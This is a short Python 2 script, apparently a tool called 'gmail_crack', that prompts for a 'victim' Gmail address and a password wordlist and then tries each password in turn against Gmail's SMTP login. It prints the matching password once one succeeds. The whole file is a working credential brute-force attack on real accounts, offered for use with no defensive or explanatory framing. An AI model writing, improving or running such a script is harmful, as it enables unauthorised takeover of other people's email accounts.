import sys,smtplib

end = '\033[0m'
yellow = '\033[33m'
red="\033[0;31m"
green="\033[0;32m"
brown="\033[0;33m"
blue="\033[0;34m"
pur="\033[0;35m" 

def __start__():
	print
	print green+"[+] Please enter victim gmail"
	print "    e.x: example@gmail.com"+end
	print
	try:
		gmail = raw_input(brown+'gmail_crack > Gmail >>> '+end)
	except KeyboardInterrupt:
		print
		sys.exit()
	print
	print green+"[+] Please enter your password file"
	print "    e.x: pass.txt"+end
	print
	passfile = raw_input(brown+'gmail_crack > PasswdFile >>> '+end)
	try:
		f = open(passfile)
		passwords = f.readlines()
		f.close()
	except Exception as error:
		print
		print red+' [-] ',error,end
		print
		sys.exit()
	try:
		server = smtplib.SMTP('smtp.gmail.com',587)
		server.ehlo()
		server.starttls()
	except Exception as error:
		print
		print red+' [-] ',error,end
		print
		sys.exit()
	print
	for password in passwords:
		password = password.strip()
		try:
			server.login(gmail,password)
			print
			print yellow+" [+] Found !"+end
			print brown+"  gmail : "+green+gmail+end
			print brown+"  passwd: "+green+password+end
			print
			sys.exit()
		except:
			print pur+' [!] Try: '+green+password+end









